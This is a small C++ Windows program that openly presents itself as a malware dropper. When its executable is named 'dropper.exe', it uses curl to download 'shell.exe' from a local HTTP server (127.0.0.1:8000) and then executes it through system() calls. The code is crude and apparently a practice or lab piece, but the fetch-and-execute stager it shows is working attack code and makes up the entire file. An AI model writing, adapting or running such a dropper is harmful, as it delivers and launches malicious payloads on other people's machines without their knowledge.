#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>
#include <Lmcons.h>
using std::string;
using namespace std;

string getFileName(const string& s) {
    char sep = '/';
#ifdef _WIN32
    sep = '\\';
#endif
    size_t i = s.rfind(sep, s.length());
    if (i != string::npos) {
        return(s.substr(i + 1, s.length() - i));
    }
    return("");
}

void dropShit() {
    string url = "http://127.0.0.1:8000/shell.exe";
    string opt1 = "curl ";
    string opt2 = "  -o shell.exe";
    string cmd = opt1 + url + opt2;
    cout << cmd;
    system(cmd.c_str());
    system("shell.exe");
}

int main(int argc, char** argv) {
    char fileName[MAX_PATH];
    char username[UNLEN + 1];
    DWORD len = UNLEN + 1;
    GetUserName(username, &len);
    string path = argv[0];

    if (getFileName(path) == "dropper.exe") {
        cout << "DROPPING :))" << endl;
        dropShit();
    }
    else {
        cout << "Fucky Wucky" << endl;
        exit(1);
    }
}
